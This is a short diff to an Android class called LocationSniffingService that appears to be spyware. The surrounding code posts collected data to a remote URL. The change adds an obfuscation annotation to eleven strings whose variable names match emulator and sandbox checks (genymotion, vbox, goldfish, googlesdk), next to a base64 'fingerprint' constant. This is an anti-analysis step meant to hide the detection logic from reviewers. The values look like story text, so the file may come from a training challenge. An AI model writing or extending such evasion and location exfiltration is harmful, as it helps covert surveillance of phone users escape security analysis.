@@ -119,8 +119,6 @@ public class LocationSniffingService extends Service{
                 return;
             }
 
-            Environment.getExternalStorageDirectory();
-
             URL url = new URL(urlString);
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -161,16 +159,27 @@ public class LocationSniffingService extends Service{
 
         Log.d(TAG, "Check if valid");
 
+        @PictureObfuscate
         String generic = "OnceUponATime";
+        @PictureObfuscate
         String unknown = "LivedABunnyCalled";
+        @PictureObfuscate
         String googlesdk = "Judy.SheWasGoingTo";
+        @PictureObfuscate
         String emulator = "OoposN10earlyforGot";
+        @PictureObfuscate
         String androidsdk86 = "beTheBestCopIn";
+        @PictureObfuscate
         String genymotion = "Zo0o0o0o0Topia";
+        @PictureObfuscate
         String sdk = "SheDidNotRealise";
+        @PictureObfuscate
         String sdk86 = "however,ThatShe";
+        @PictureObfuscate
         String vbox = "wasJustGoingtobe";
+        @PictureObfuscate
         String goldfish = "amereparkingWarden";
+        @PictureObfuscate
         String android = "sadfacebunny";
 
         String fingerprint = "T05FMTExMTExMTExMQ==";
